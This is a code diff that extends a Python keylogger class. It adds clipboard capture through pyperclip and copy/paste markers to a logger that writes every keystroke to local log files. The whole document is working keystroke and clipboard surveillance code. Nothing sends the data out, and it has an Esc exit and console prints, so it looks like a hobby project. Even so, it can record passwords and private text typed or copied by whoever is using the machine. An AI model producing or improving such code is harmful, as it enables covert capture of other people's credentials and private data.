@@ -1,4 +1,5 @@
 from pynput.keyboard import Key, Listener, Controller
+import pyperclip
 import threading
 import os
 
@@ -16,7 +17,9 @@ class Keylogger:
             "Key.tab": "[TAB]",
             "Key.backspace": "[BACKSPACE]",
             "Key.caps_lock": "[CAPSLOCK]",
-            "Key.ctrl": "[CTRL]"
+            "Key.ctrl": "[CTRL]",
+            r"'\x03'":  "\n[COPIED TO CLIPBOARD] \n",
+            r"'\x16'": "\n[Pasted: " + self.getClipBoard() + "]\n"
         }
         self.standardkey = True
 
@@ -29,8 +32,6 @@ class Keylogger:
 
     # When a key is pressed on keyboard
     def key_press(self, key):
-        
-        
         # ESCAPE CLAUSE
         if key == Key.esc:
             print("ESCAPED: ")
@@ -38,7 +39,6 @@ class Keylogger:
             return False
 
         with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes:
-
             # key codes
             # This produces an output unreadable to humans
             print("added code: " + str(key))
@@ -46,9 +46,11 @@ class Keylogger:
 
             # readable keys
             for keycode in self.modifier_keys:
+                # print("key = " + str(key) + " code = " + keycode)
                 if keycode == str(key):
                     self.standardkey = False
                     log.write(self.modifier_keys[keycode])
+
                     break
             if self.standardkey:
                 log.write(str(key).replace("'", ""))
@@ -58,6 +60,15 @@ class Keylogger:
            with Listener(on_press=self.key_press) as listener:
             listener.join()  # listening for keystrokes
 
+    def getClipBoard(self):
+        cb = pyperclip.paste()  # getting the clipboard
+
+        if len(cb) == 0:
+            contents = "/No Clipboard contents/"
+        else:
+            contents = cb
+        print(contents)
+        return contents
 
 start = Keylogger()
 kThread = threading.Thread(target=start.log)
